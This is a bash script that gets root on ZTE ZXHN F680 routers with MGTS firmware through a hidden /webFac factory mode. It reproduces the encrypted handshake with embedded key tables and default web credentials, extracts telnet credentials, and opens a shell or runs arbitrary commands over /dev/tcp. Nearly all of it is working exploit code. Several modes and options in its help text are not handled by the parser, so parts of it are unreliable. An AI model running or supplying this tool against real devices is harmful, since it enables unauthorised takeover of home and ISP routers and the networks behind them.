#!/usr/bin/env bash
# f680-root.sh - root shell on a ZTE ZXHN F680 through the hidden /webFac
# factory mode. Run without arguments to see the help.

set -u

NAME=$(basename "$0")

usage() {
    cat <<EOF
$NAME - root shell on a ZTE ZXHN F680 (MGTS V9.1.10P1N9)
            via the hidden /webFac factory mode

usage: $NAME [mode] [options]

modes (pick one; none prints this help):
  -shell          open an interactive console
  -status         read-only health report over telnet
  -exec "CMD"     run one command on the router, print its output
  -creds          print the telnet user and password only
  -check          probe /webFac and exit, change nothing
  -config [DIR]   download the event log and config
  -menu           interactive menu: TR-069, tuning, telnet

options:
  -ip <addr>      router address          default 192.168.1.1
  -port <n>       web port                default 80
  -u, -user <n>   web login               default mgts
  -p, -pass <pw>  web password            default mtsoao
  -host <addr>    this machine as the router sees it (for -config)
  -rand <0-59>    pin the key slot instead of picking one at random
  -retries <n>    handshake attempts      default 4
  -timeout <sec>  HTTP timeout            default 20
  -dry-run        with -menu: print commands instead of writing
  -quiet          print only the result
  -h, -help       this help

examples:
  $NAME -shell
  $NAME -status
  $NAME -exec "displayDB DevInfo"
  $NAME -ip 192.168.1.1 -u mgts -p mtsoao -creds

notes:
  one dash or two, same thing: -status == --status
  credentials rotate on every run; the previous password stops working
  telnetd survives reboots, so after a restart just re-run
  telnet allows two sessions; a closed one holds its slot for 300 seconds
EOF
}

IP=192.168.1.1
PORT=80
WEBUSER=mgts
WEBPASS=mtsoao
MODE=help
COMMAND=""
QUIET=0

while [ $# -gt 0 ]; do
    opt=${1#-}
    opt=${opt#-}
    case "$opt" in
        ip)      IP=${2:-}; shift 2 ;;
        port)    PORT=${2:-}; shift 2 ;;
        u|user)  WEBUSER=${2:-}; shift 2 ;;
        p|pass)  WEBPASS=${2:-}; shift 2 ;;
        shell)   MODE=shell; shift ;;
        creds)   MODE=creds; shift ;;
        check)   MODE=check; shift ;;
        status)  MODE=status; shift ;;
        exec)    MODE=exec; COMMAND=${2:-}; shift 2 ;;
        quiet)   QUIET=1; shift ;;
        h|help)  usage; exit 0 ;;
        *) echo "unknown option: $1" >&2; usage >&2; exit 64 ;;
    esac
done

if [ "$MODE" = help ]; then
    usage
    exit 0
fi

BASE="http://$IP:$PORT"
TMP=$(mktemp -d) || exit 1
READER=0

cleanup() {
    [ "$READER" -ne 0 ] && kill "$READER" 2>/dev/null
    exec 3<&- 3>&- 2>/dev/null
    rm -rf "$TMP"
}
trap cleanup EXIT INT TERM

die() { echo "[!] $*" >&2; exit 1; }
say() {
    [ "$QUIET" -eq 1 ] && return 0
    case "$MODE" in shell|status|exec) echo "$*" ;; esac
}

# POST a raw body; $1=body file $2=response file $3=path -> prints HTTP status.
post() {
    curl -sS --max-time 20 -o "$2" -w '%{http_code}' \
         -H 'Content-Type: application/octet-stream' \
         -H 'User-Agent: Mozilla/5.0' \
         --data-binary @"$1" "$BASE/$3" 2>/dev/null
}

pad16() {
    local size rem
    size=$(wc -c < "$1" | tr -d ' ')
    rem=$((size % 16))
    [ "$rem" -eq 0 ] || dd if=/dev/zero bs=1 count=$((16 - rem)) >> "$1" 2>/dev/null
}

aes() {  # $1=hex key, $2=in, $3=out, $4=-d for decrypt
    local flag=""
    [ "${4:-}" = "-d" ] && flag="-d"
    openssl enc $flag -aes-192-ecb -nopad -K "$1" -in "$2" -out "$3" 2>/dev/null
}

# --------------------------------------------------------------------------
# 1. Handshake
# --------------------------------------------------------------------------
printf 'SendSq.gch' > "$TMP/body"
ST=$(post "$TMP/body" "$TMP/out" webFac)

if [ "$MODE" = check ]; then
    if [ "$ST" = "400" ] && grep -qi 'bad syntax' "$TMP/out"; then
        echo "[ok] /webFac factory surface present (HTTP 400)"
        exit 0
    fi
    echo "[--] /webFac not detected (HTTP $ST)" >&2
    exit 3
fi

say "[1] reset              -> $ST"

# RequestFactoryMode answers by dropping the socket. That is success.
printf 'RequestFactoryMode.gch' > "$TMP/body"
post "$TMP/body" "$TMP/out" webFac >/dev/null 2>&1 || true

RAND=$(( $(od -An -N2 -tu2 /dev/urandom | tr -d ' ') % 60 ))
printf 'SendSq.gch?rand=%s\r\n' "$RAND" > "$TMP/body"
ST=$(post "$TMP/body" "$TMP/out" webFac)
[ "$ST" = "200" ] || die "handshake refused (HTTP $ST) - is the router up?"

# Key tables: the device hands out a 24-byte slice (AES-192), XOR 0xA5.
POOL1='7B56B0F7DA0E6852C819F32B849079E562F8EAD2649387DF73D7FBCCAAFE75431C29DF4C522C6E7B453D1FF1DEBC27858A4591BE3813DE673208541175F4D3B4A4B312866723994C617FB1D230DF47F17693A38C95D359BF878EF3B3E4764988'
POOL2='8C2365D1FC324537112871630720691473E7D453132436C2B5E1FCCF8A9A41893C49CF5C728C9EEB750D3FD1FECC57657A35213E68537E970248747195345384B4C3E2D6273DE65D729CBC3D03FD76C19C25A89247E4180F243F4F67EC97F499'

if [ ! -s "$TMP/out" ]; then
    INDEX=$RAND
    POOL=$POOL1
    VER=1
    say "[2] SendSq rand=$RAND      -> 200 (protocol v1)"
else
    NEWRAND=$(tr -d '\000\r\n ' < "$TMP/out" | sed 's/^newrand=//')
    case "$NEWRAND" in
        ''|*[!0-9]*) die "unexpected handshake reply: $(cat "$TMP/out")" ;;
    esac
    INDEX=$(( ((0x1000193 * RAND & 0x3F) ^ NEWRAND) % 60 ))
    POOL=$POOL2
    VER=2
    say "[2] SendSq rand=$RAND      -> 200 (protocol v2, slot $INDEX)"
fi

KEYHEX=$(printf '%s' "$POOL" | cut -c$(( INDEX * 2 + 1 ))-$(( INDEX * 2 + 48 )) \
         | sed 's/../&\n/g' \
         | while read -r b; do [ -n "$b" ] && printf '%02x' $(( 0x$b ^ 0xA5 )); done)

if [ "$VER" -eq 2 ]; then
    printf 'SendInfo.gch?info=6|' > "$TMP/plain"
    pad16 "$TMP/plain"
    aes "$KEYHEX" "$TMP/plain" "$TMP/body"
    post "$TMP/body" "$TMP/out" webFacEntry >/dev/null 2>&1 || true
    say "[3] SendInfo           -> done"
fi

printf 'CheckLoginAuth.gch?version50&user=%s&pass=%s' "$WEBUSER" "$WEBPASS" > "$TMP/plain"
pad16 "$TMP/plain"
aes "$KEYHEX" "$TMP/plain" "$TMP/body"
ST=$(post "$TMP/body" "$TMP/out" webFacEntry)
[ "$ST" = "200" ] || die "login rejected (HTTP $ST) - wrong web password?"
say "[4] CheckLoginAuth     -> $ST"

printf 'FactoryMode.gch?mode=2&user=notused' > "$TMP/plain"
pad16 "$TMP/plain"
aes "$KEYHEX" "$TMP/plain" "$TMP/body"
ST=$(post "$TMP/body" "$TMP/out" webFacEntry)
[ "$ST" = "200" ] || die "factory mode refused (HTTP $ST)"
say "[5] FactoryMode mode=2 -> $ST"

aes "$KEYHEX" "$TMP/out" "$TMP/plain" -d
REPLY=$(tr -d '\000' < "$TMP/plain")
case "$REPLY" in
    *FactoryModeAuth.gch*) ;;
    *) die "unexpected reply: ${REPLY:0:120}" ;;
esac

TUSER=$(printf '%s' "$REPLY" | sed -n 's/.*user=\([^& ]*\).*/\1/p')
TPASS=$(printf '%s' "$REPLY" | sed -n 's/.*pass=\([^& ]*\).*/\1/p')
[ -n "$TUSER" ] && [ -n "$TPASS" ] || die "could not parse credentials: ${REPLY:0:120}"

echo "host: $IP"
echo "user: $TUSER"
echo "pass: $TPASS"
echo "telnet $IP"

# telnetd allows Max_Con_Num=2 sessions and keeps a closed session's slot busy
# for ExitTime seconds, so never probe the port: connect exactly once.
[ "$MODE" = creds ] && exit 0

# --------------------------------------------------------------------------
# 2. One login, many commands (-status / -exec)
# --------------------------------------------------------------------------
SEQ=0

# run_remote <command> -> prints the output, without echo and prompt.
# Markers are written as @@'SaN'@@ so the echoed command line cannot match them.
run_remote() {
    local seq start stop i
    SEQ=$((SEQ + 1))
    seq=$SEQ
    start="@@Sa${seq}@@"
    stop="@@Sb${seq}@@"
    printf "printf '\\\\n'; echo @@'Sa%s'@@; %s; echo @@'Sb%s'@@\r\n" \
        "$seq" "$1" "$seq" >&3
    i=0
    while [ "$i" -lt 300 ]; do
        grep -q -- "$stop" "$TMP/session" 2>/dev/null && break
        sleep 0.2
        i=$((i + 1))
    done
    awk -v start="$start" -v stop="$stop" '
        index($0, start) { on = 1; next }
        index($0, stop)  { exit }
        on
    ' "$TMP/session"
}

status_report() {
    run_remote 'cat /proc/uptime'
    run_remote 'cat /proc/cpuusage'
    run_remote 'cat /proc/loadavg'
    run_remote 'free'
    run_remote 'displayDB DevInfo'
    run_remote 'ifconfig nbif0'
    run_remote 'route -n'
    run_remote 'cat /proc/sys/net/netfilter/nf_conntrack_count'
    run_remote 'cat /proc/sys/net/netfilter/nf_conntrack_max'
    run_remote 'displayDB MgtServer'
    run_remote 'displayDB TelnetCfg'
    run_remote 'cat /proc/watchdog/ctrl'
    run_remote 'displayDB DHCPSHostInfo'
    run_remote 'cat /proc/net/arp'
}

# Reader: strip telnet IAC bytes and print each line, unbuffered.
# awk (not tr) because tr block-buffers when writing to a file and the marker
# lines would sit in its buffer until 4 KB accumulated.
start_reader() {
    if [ "$MODE" = shell ]; then
        awk '{ gsub(/[\377\375\376\373\374\001\003]/, ""); print; fflush() }' <&3 &
    else
        awk '{ gsub(/[\377\375\376\373\374\001\003]/, ""); print; fflush() }' \
            <&3 >> "$TMP/session" &
    fi
    READER=$!
}

exec 3<>"/dev/tcp/$IP/23" || die "cannot reach $IP:23 - close other telnet sessions"
start_reader

sleep 0.8
printf '%s\r\n' "$TUSER" >&3
sleep 0.8
printf '%s\r\n' "$TPASS" >&3
sleep 1.2

if [ "$MODE" = exec ]; then
    run_remote "$COMMAND"
    exit 0
fi

if [ "$MODE" = status ]; then
    status_report > "$TMP/raw"
    echo
    echo "--- raw tables collected in $TMP/raw"
    echo
    cat "$TMP/raw"
    exit 0
fi

# --------------------------------------------------------------------------
# 3. Console
# --------------------------------------------------------------------------
echo
echo "  ZTE F680 shell - 'exit' to leave. Credentials rotate every run."
echo

# Send keystrokes one at a time so the device echoes them back as you type.
LINE=""
while IFS= read -rsn1 key; do
    case "$key" in
        '')
            printf '\r\n' >&3
            case "$LINE" in
                exit|quit|logout) break ;;
            esac
            LINE=""
            ;;
        $'\177'|$'\b')
            printf '\177' >&3
            [ -n "$LINE" ] && LINE=${LINE%?}
            ;;
        *)
            printf '%s' "$key" >&3
            LINE="$LINE$key"
            ;;
    esac
done

sleep 1.5
